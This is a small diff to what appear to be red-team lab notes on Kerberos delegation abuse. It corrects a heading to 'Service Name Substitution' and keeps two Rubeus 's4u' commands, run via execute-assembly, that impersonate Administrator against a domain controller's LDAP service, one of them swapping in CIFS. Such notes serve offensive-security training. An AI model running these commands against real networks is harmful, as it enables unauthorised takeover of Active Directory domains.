@@ -56,7 +56,7 @@ Perform the S4U abuse to obtain a usable service ticket for **a service listed i
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:LON-WKSTN-1$ /msdsspn:ldap/lon-dc-1 /impersonateuser:Administrator /nowrap /ticket:
 ```
 
-With protocol transition **/altservice**
+With Service Name Substitution **/altservice**
 ```powershell
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:LON-WKSTN-1$ /msdsspn:ldap/lon-dc-1 /impersonateuser:Administrator /nowrap /altservice:cifs /ticket:
 ```
